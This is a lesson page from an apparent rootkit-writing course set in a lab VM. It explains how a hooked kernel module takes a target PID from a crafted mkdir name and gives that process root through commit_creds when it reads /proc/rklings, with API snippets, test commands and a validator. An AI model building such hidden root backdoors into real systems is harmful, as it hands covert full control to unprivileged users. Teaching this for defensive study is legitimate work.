# L07: PID Escalation

L06 escalates the process that calls mkdir.
But the process you want to escalate might be someone else's shell, a daemon, or
a service you cannot run mkdir from.
You need deferred delivery: set a target, wait for that process to trigger it.

## current

`current` is a per-CPU macro that points to the `struct task_struct` of the
process running on this CPU right now.
Every kernel function can read `current->pid`, `current->cred`, `current->comm`
to identify the calling process.
L06's `commit_creds` worked because it changes credentials on `current`.

## Deferred execution

The attacker sets a target PID with `mkdir rklings.e.<pid>`.
The module stores it.
When the target process reads `/proc/rklings`, the module checks `current->pid`
and escalates on match.

```text
  Attacker                           Target (pid 1234)
    |                                     |
    | mkdir rklings.e.1234                |
    |----> RK_ON_MKDIR                    |
    |      atomic_set(pid, 1234)          |
    |                                     |
    |                         cat /proc/rklings
    |                         rk_proc_show ---|
    |                         pid match? yes  |
    |                         rk_escalate()   |
    |                         atomic_set(0)   |
    |                                     |
    |                         id -> uid=0(root)
```

## atomic_t

The target PID is shared between the mkdir handler (writer) and the proc handler
(reader).
These can run on different CPUs at the same time.
`atomic_t` provides safe concurrent access without a full spinlock:

```c
static atomic_t rk_target_pid = ATOMIC_INIT(0);

atomic_set(&rk_target_pid, pid);           // store
int target = atomic_read(&rk_target_pid);  // load
```

## Three mkdir cases

The mkdir handler now parses the suffix:

- `"rklings.e"` (no dot after): self-escalation via `commit_creds`
- `"rklings.e.<pid>"`: parse PID with `kstrtoint`, store in atomic
- Anything else: return `-ENOENT`

```c
int kstrtoint(const char *s, unsigned int base, int *res);
```

`kstrtoint` is the kernel's safe string-to-int.
It rejects trailing garbage and overflow.
Always check its return value.

## You write

`main.c` (~120 lines):

- mkdir handler with three cases (`rklings.e`, `rklings.e.<pid>`, other)
- `rk_escalate` for credential replacement
- `/proc/rklings` with deferred PID delivery

## API

```c
#include <linux/atomic.h>
static atomic_t rk_target_pid = ATOMIC_INIT(0);

atomic_set(&rk_target_pid, pid);
int target = atomic_read(&rk_target_pid);

#include <linux/proc_fs.h>
#include <linux/seq_file.h>
static const struct proc_ops rk_proc_ops;
proc_create("rklings", 0444, NULL, &rk_proc_ops);

int kstrtoint(const char *s, unsigned int base, int *res);
```

## Test it

The module is pre-loaded.
You log in as student.

```
$ rklings run l07

(Terminal 1)
student@vm:~$ echo $$
1234

(Terminal 2)
student@vm:~$ mkdir rklings.e.1234
student@vm:~$ dmesg | tail -1
rklings: targeting pid 1234

(Terminal 1)
student@vm:~$ cat /proc/rklings
rklings: escalated
student@vm:~$ id
uid=0(root) gid=0(root) groups=0(root)
```

Self-escalation still works:

```
student@vm:~$ mkdir rklings.e
student@vm:~$ id
uid=0(root) gid=0(root) groups=0(root)
```

## Validate

```
$ rklings validate l07
  [+] module loaded
  [+] self-escalation via mkdir rklings.e
  [+] PID targeting via mkdir rklings.e.<pid>
  [+] dmesg shows PID targeting
  [+] deferred delivery on /proc/rklings read
  PASS
```

## Next

You have been using rklings_hook.h as a black box.
L08 opens it, explains every line, and rebuilds mkdir interception from scratch
using kprobes.
